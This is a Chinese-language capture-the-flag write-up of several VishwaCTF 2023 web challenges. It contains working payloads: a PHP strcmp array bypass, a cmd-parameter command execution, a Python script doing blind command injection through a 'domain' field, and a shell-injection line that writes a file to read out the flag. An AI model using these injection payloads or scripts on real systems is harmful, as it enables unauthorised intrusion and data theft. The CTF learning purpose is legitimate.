
### Eeezzy

```php
<?php

    session_start();
    $_SESSION['status']=null;

    $flag="";
    try {
        if (isset($_GET['username']) && isset($_GET['password'])) {
            if (strcmp($_GET['username'], $flag)==0 && strcmp($_GET['password'], $flag)==0)
                $_SESSION['status']=$flag;
            else
                $_SESSION['status']="Invalid username or password";
        }
    } catch (Throwable $th) {
        $_SESSION['status']=$flag;
    }

?>
```

![image-20230402143632411](https://gitee.com/leiye87/typora_picture/raw/master/20230405031642.png)

根据回显也可知道会输出 $_SESSION['status'] 的内容

所以只需要抛出Throwable异常即可

payload

```
?username=0&password[]=
```

但是我不理解的是，为什么之前尝试username[] 没有成功，仅限于password单独为数组的时候才会报错

### Payload

![image-20230402145420078](https://gitee.com/leiye87/typora_picture/raw/master/20230405031908.png)

点击system details 会回显系统信息。只增加了 btn一个参数也没有值，猜测回显条件为 `isset($_GET['btn'])`

robots.txt  下存在源码，cmd可以直接执行命令

payload：

`?cmd=cat index.php`

![image-20230402150855478](https://gitee.com/leiye87/typora_picture/raw/master/20230405031842.png)

### aLive

![image-20230402151523360](https://gitee.com/leiye87/typora_picture/raw/master/20230405031903.png)

可以执行命令，但只会回显bool

![image-20230402152022219](https://gitee.com/leiye87/typora_picture/raw/master/20230405031918.png)

![image-20230402152532546](https://gitee.com/leiye87/typora_picture/raw/master/20230405031920.png)

过滤了 echo，printf写马502

接下来就是根据命令回显盲注

```python
import requests
url="https://ch431629117491.ch.eng.run/"
data={
    "domain":";test `tac ./fl*|cut -c {0}` = \"{1}\" && printf \"The characters are equal.\""
}

print(data['domain'])

flag=""
for i in range(9,20):
    for j in range(70,128):
        data={
        "domain":";test `tac ./fl*|cut -c {0}` = \"{1}\" && printf \"The characters are equal.\"".format(i,chr(j))
        }
        result=requests.post(url=url,data=data)
        # print(data["domain"].format(i,chr(j)),result.text)
        print(i,chr(j))
        if "is inactive!" in result.text:
            j+=1
        else:
            flag+=chr(j)
            print(flag)
            break
print(flag)
```

太慢了，搞出来一个非预期  
  
payload   

```
;base64 ./fla*>shell.php  
```

 访问后base64解码  

`VishwaCTF{b1inD_cmd-i}`
根据flag看应该是非预期

### Mascot

除了一个前端井字棋游戏之外啥也没有

太离谱了，git泄露，不需要githacker，泄露了github地址，直接跟过去得到 flaggg.md



https://github.com/CybercellVIIT/VishwaCTF-23_Official_Writeups
